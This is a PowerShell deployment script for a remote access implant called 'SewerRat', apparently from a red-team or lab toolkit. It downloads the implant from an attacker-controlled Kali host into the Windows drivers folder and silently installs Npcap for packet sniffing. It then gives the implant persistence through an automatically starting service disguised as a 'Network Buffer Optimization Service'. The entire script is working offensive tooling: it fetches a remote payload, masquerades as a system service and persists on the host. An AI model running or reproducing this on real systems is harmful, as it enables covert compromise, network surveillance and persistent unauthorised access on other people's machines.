# ============================================================================
# SewerRat PowerShell Deployment Script
# REQUIRES: Administrator Privileges
# ============================================================================

param (
    [string]$KaliIP = "192.168.1.223", # Change to your Kali IP or pass as -KaliIP "x.x.x.x"
    [string]$KaliPort = "80"
)

# Elevate privileges if not running as Admin
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Warning "[-] This script requires Administrator privileges. Please run as Administrator."
    exit
}

$ImplantURL = "http://${KaliIP}:${KaliPort}/dist/SewerRat.exe"
$DestPath = "C:\Windows\System32\drivers\SewerRat.exe"
$NpcapexeURL = "http://${KaliIP}:${KaliPort}/npcap-1.87.exe"
$DestPathNpcap = "C:\Windows\Temp\npcap-1.87.exe"
$ServiceName = "Win32NetworkBuffer"

Write-Host "[*] Downloading Npcap installer from $NpcapexeURL..."
try {
    Invoke-WebRequest -Uri $NpcapexeURL -OutFile $DestPathNpcap -UseBasicParsing
    Write-Host "[+] Download successful: $DestPathNpcap"
} catch {
    Write-Host "[-] Download failed: $_"
    exit
}

Write-Host "[*] Installing Npcap silently (Required for Layer 2 Packet Sniffing)..."
try {
    $process = Start-Process -FilePath $DestPathNpcap -ArgumentList "/S", "/winpcap_mode=yes", "/admin_only=no" -Wait -PassThru
    if ($process.ExitCode -eq 0) {
        Write-Host "[+] Npcap installed successfully."
    } else {
        Write-Host "[-] Npcap installation may have encountered an issue (Exit Code: $($process.ExitCode)). Continuing anyway..."
    }
} catch {
    Write-Host "[-] Failed to execute Npcap installer: $_"
}

Write-Host "[*] Cleaning up Npcap installer..."
Remove-Item -Path $DestPathNpcap -Force -ErrorAction SilentlyContinue

Write-Host "[*] Downloading SewerRat implant from $ImplantURL..."
try {
    Invoke-WebRequest -Uri $ImplantURL -OutFile $DestPath -UseBasicParsing
    Write-Host "[+] Download successful: $DestPath"
} catch {
    Write-Host "[-] Download failed: $_"
    exit
}

Write-Host "[*] Creating persistence via service '$ServiceName'..."
try {
    # If service already exists, stop and delete it first
    if (Get-Service -Name $ServiceName -ErrorAction SilentlyContinue) {
        Write-Host "[!] Service already exists. Cleaning up old service..."
        Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
        sc.exe delete $ServiceName
        Start-Sleep -Seconds 2
    }

    # Create the service pointing to our downloaded executable
    New-Service -Name $ServiceName `
                -BinaryPathName $DestPath `
                -StartupType Automatic `
                -Description "Network Buffer Optimization Service run at startup" | Out-Null
                
    Write-Host "[+] Service created successfully."
} catch {
    Write-Host "[-] Failed to create service: $_"
    exit
}

Write-Host "[*] Starting service to execute implant..."
try {
    Start-Service -Name $ServiceName
    Write-Host "[+] Service started successfully! SewerRat is now running."
} catch {
    Write-Host "[-] Failed to start service: $_"
}

Write-Host "[*] Deployment complete!"